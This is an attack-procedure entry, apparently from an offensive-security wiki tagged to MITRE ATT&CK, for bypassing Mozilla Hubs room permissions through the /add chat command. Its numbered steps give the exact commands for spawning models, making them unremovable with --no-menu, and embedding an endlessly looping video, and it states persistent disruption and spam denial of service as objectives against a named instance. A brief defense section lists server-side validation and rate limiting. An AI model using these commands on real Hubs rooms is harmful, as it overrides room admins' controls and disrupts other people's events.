---
id: proc-mozilla-hubs-spawn-bypass-001
tags:
  - broken-access-control
  - chat-bypass
  - object-spawn
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/hubs-add-model]]'
  - '[[commands/hubs-add-unremovable-model]]'
  - '[[commands/hubs-add-youtube-video]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:30:46.942Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Spawn-Objects-via-Chat-Bypass

## Summary

This procedure exploits the lack of server-side validation in Mozilla Hubs chat commands to spawn 3D models and media objects in restricted rooms, bypassing admin-disabled permissions for object creation.

## Description

In Mozilla Hubs, room admins can disable object creation, but the /add chat command processes WebSocket requests without checking these rules, relying solely on client-side enforcement. This allows non-admins to spawn persistent, unremovable objects like GLB models or YouTube videos, disrupting events by spamming or embedding unwanted content. The attack targets WebSocket endpoints in Hubs rooms and works on instances like https://quikke.dev.myhubs.net/.

## Requirements

1. Access to a restricted Hubs room URL
2. Web browser to join the room
3. Valid asset URLs for models or media

## Defense

Defensive measures and detection strategies:

- Implement server-side validation for all chat commands against room permissions
- Rate-limit /add commands per user/session
- Scan spawned objects for malicious content and auto-remove

## Objectives

1. Demonstrate bypass of access controls for object placement
2. Create persistent disruptions like unremovable media
3. Enable spamming for denial-of-service in virtual spaces

## Instructions

### Step 1: Join Restricted Room

**Context**: Enter the room to access chat without object UI.

No command; navigate to room URL (e.g., https://quikke.dev.myhubs.net/eE97EwL/quikke-test-server) and join.

> Chat panel opens; no spawn tools visible.

### Step 2: Spawn Removable Model

**Context**: Test basic bypass with a deletable object.

**Command** ([[commands/hubs-add-model]]):
```bash
/add https://quikke.assets.dev.myhubs.net/hubs/assets/models/DuckyMesh-b80f0ece1f58a683839a..glb
```

> Duck model spawns; users can interact and delete via menu.

### Step 3: Spawn Unremovable Model

**Context**: Use flag for persistence.

**Command** ([[commands/hubs-add-unremovable-model]]):
```bash
/add --no-menu https://quikke.assets.dev.myhubs.net/hubs/assets/models/DuckyMesh-b80f0ece1f58a683839a..glb
```

> Unremovable duck appears; no delete option.

### Step 4: Embed Unremovable Video

**Context**: Add disruptive media that loops indefinitely.

**Command** ([[commands/hubs-add-youtube-video]]):
```bash
/add --no-menu https://www.youtube.com/watch?v=dQw4w9WgXcQ
```

> Video embeds and plays; cannot stop or remove; repeatable for spam.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/hubs-add-model]]
- [[commands/hubs-add-unremovable-model]]
- [[commands/hubs-add-youtube-video]]

## Tools Used


## Tags

- [[broken-access-control]]
- [[chat-bypass]]
- [[object-spawn]]
